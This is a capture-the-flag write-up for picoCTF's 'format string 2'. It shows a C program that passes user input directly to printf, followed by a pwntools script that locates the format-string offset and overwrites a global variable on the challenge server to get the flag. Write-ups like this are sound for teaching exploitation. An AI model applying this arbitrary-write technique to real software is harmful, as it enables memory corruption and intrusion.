# format string 2


This challenge from [picoCTF](https://play.picoctf.org/practice/challenge/448) asks us to change the content of a variable to retrieve the flag.


First, let's look at the source code:
```c
#include <stdio.h>

int sus = 0x21737573;

int main() {
  char buf[1024];
  char flag[64];


  printf("You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your input: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  if (sus == 0x67616c66) {
    printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");

    // Read in the flag
    FILE *fd = fopen("flag.txt", "r");
    fgets(flag, 64, fd);

    printf("%s", flag);
    fflush(stdout);
  }
  else {
    printf("sus = 0x%x\n", sus);
    printf("You can do better!\n");
    fflush(stdout);
  }

  return 0;
}
```

We can see that we need to set the `sus` value from `0x21737573` to `0x67616c66`. 
And like in the first challenge, our input is directly set in printf without preformating.

We can retrieve the `sus` adress using  the [pwntools FmtStr class](https://docs.pwntools.com/en/stable/fmtstr.html)

```py
from pwn import *

binary = './vuln'
elf = context.binary = ELF(binary)

def test_payload(payload):
    process_instance = elf.process()
    process_instance.sendline(payload)
    output = process_instance.recvall()
    process_instance.close()
    return output

fmt = FmtStr(test_payload)
offset = fmt.offset

log.info(f"Address of 'sus': {elf.symbols['sus']:x}")
```

```
[*] Address of 'sus': 404060
```


We can then get the flag on the remote with:

```py
p.sendline(fmtstr_payload(offset, {elf.symbols['sus']: 0x67616c66}))
```

# Solve

```py
from pwn import *

binary = './vuln'
elf = context.binary = ELF(binary)

def test_payload(payload):
    process_instance = elf.process()
    process_instance.sendline(payload)
    output = process_instance.recvall()
    process_instance.close()
    return output

fmt = FmtStr(test_payload)
offset = fmt.offset

log.info(f"Address of 'sus': {elf.symbols['sus']:x}")

p = remote('rhea.picoctf.net', 53666)
p.sendline(fmtstr_payload(offset, {elf.symbols['sus']: 0x67616c66}))
p.interactive()
```